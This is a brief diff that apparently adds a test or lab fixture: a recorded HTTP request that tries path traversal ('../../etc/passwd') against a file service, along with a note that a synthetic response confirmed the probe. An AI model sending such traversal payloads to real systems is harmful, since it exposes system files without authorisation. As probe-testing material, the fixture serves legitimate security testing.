@@ -1,0 +1,7 @@
+request:
+GET /static?path=../../etc/passwd
+Host: svc-files:8008
+User-Agent: tanyin/1
+Connection: close
+
+observed: beacon-confirmed synthetic response
